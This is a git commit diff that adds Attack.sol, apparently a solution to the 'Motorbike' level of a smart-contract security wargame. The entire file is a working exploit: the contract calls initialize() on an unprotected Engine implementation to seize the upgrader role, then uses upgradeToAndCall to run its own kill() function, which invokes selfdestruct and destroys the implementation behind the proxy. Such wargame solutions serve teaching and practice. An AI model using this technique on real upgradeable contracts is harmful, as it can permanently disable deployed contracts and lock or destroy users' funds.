f4b8db630ccd97fb010eab210300ef143ca895c6
0xgtim <99255480+timou0911@users.noreply.github.com>
2024-12-25 12:02:58 +0800

    Update Attack.sol

--- 25. Motorbike ★★★☆☆/Attack.sol
+++ 25. Motorbike ★★★☆☆/Attack.sol
@@ -1,1 +1,27 @@
+// SPDX-License-Identifier: MIT
 
+pragma solidity  ^0.8.0;
+
+interface IEngine {
+    function upgrader() external view returns (address);
+    function horsePower() external view returns (uint256);
+    function initialize() external;
+    function upgradeToAndCall(address newImplementation, bytes memory data) external payable;
+}
+
+contract Attack {
+    IEngine target;
+
+    constructor(address targetAddr) {
+        target = IEngine(targetAddr);
+    }
+
+    function attack() public {
+        target.initialize();
+        target.upgradeToAndCall(address(this), abi.encodeWithSelector(this.kill.selector));
+    }
+
+    function kill() public {
+        selfdestruct(payable(msg.sender));
+    }
+}
